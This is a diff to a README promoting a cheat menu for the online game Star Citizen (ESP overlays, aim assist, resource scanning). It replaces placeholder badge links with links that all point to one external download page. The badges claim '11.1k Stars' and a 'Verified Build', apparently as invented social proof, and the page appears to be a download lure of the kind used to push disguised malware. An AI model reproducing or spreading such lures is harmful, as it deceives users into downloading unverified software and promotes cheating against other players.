@@ -23,10 +23,10 @@ Instead of juggling radar, ship systems, and terrain maps, this cheat menu puts 
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 11.1k Stars](https://img.shields.io/badge/GitHub-11.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
+[![⭐️ 11.1k Stars](https://img.shields.io/badge/GitHub-11.1k_Stars-green?logo=github\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
 
 ---
 
@@ -158,8 +158,8 @@ A: It lowers risk but no cheat is 100% undetectable.
 
 The **Star Citizen Cheat Menu** combines **ESP overlays, aim assist, and resource scanning** into a single package. Whether mining asteroids, engaging in PvP dogfights, or coordinating fleet operations, it ensures better awareness and precision in the vast verse.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://star-citizen-cheats-menu.github.io/.github/)
 
 ---
